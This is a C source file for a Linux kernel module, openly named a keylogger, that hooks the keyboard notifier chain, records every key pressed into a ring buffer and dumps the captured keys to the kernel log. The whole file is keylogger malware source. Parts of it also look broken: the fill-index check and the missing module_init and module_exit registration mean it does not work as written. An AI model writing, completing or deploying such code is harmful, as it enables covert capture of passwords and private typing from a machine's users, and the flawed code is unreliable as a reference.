#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/slab.h>

#include "keylogger.h"

#define BUFFER_SIZE 4096  // Buffer size in bytes
#define KBD_IRQ 1  // Keyboard IRQ number

MODULE_LICENSE("GPL");


char buffer[BUFFER_SIZE] = {'\0'};
int fill = 0;  // Index to fill buffer

void producer(char key){
    buffer[fill] = key;
    fill = (fill + 1) % BUFFER_SIZE;
}

/**
    Don't forget to kfree this after using
    Call this and you'll have BUFFER_SIZE chars to print
    All \0 is non inputs (should not print)
*/
char *consumer(void){
    int num_items_to_consume = BUFFER_SIZE;
    int consumed_count = 0;
    char *consumed_items = (char *)kmalloc(num_items_to_consume * sizeof(char), GFP_KERNEL);

    for(int i = 0; i<num_items_to_consume; i++){
        consumed_items[i] = '\0';
    }
    
    while (consumed_count < num_items_to_consume) {
        char item = buffer[(fill - consumed_count - 1 + BUFFER_SIZE) % BUFFER_SIZE];
        buffer[(fill - consumed_count - 1 + BUFFER_SIZE) % BUFFER_SIZE] = '\0';
        
        consumed_items[consumed_count] = item;
        consumed_count++;
    }

    return consumed_items;
}

// Keyboard interrupt handler
irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id)
{
    struct keyboard_notifier_param *param = dev_id;

    if (param && param->value) {
        unsigned int keycode = param->value;

        char key = (char)keycode;

        // Store the keycode in a linked list or perform any other required operation
        producer(key);

        if(fill > 100){
            char* keys = consumer();
            printk(KERN_INFO "Keys pressed: ");
            for(int i = 0; i < BUFFER_SIZE; i++){
                printk(KERN_INFO " %c,", keys[i]);
            }
            kfree(keys);
            printk(KERN_INFO "\n");
        }
    }

    return IRQ_NONE;
}

// Keyboard notifier callback
int keyboard_notifier_callback(struct notifier_block *nblock, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *param = _param;

    if (code == KBD_KEYSYM && param && param->down) {
        // Call the keyboard interrupt handler
        keyboard_interrupt_handler(0, param);
    }

    return NOTIFY_OK;
}

struct notifier_block keyboard_notifier_block = {
    .notifier_call = keyboard_notifier_callback,
};

int __init keyboard_module_init(void)
{
    int result;

    // Register the keyboard notifier
    result = register_keyboard_notifier(&keyboard_notifier_block);
    if (result != 0) {
        printk(KERN_ERR "Failed to register keyboard notifier\n");
        return result;
    }

    printk(KERN_INFO "Keyboard module initialized\n");
    return 0;
}

void __exit keyboard_module_exit(void)
{
    // Unregister the keyboard notifier
    unregister_keyboard_notifier(&keyboard_notifier_block);

    printk(KERN_INFO "Keyboard module exited\n");
}
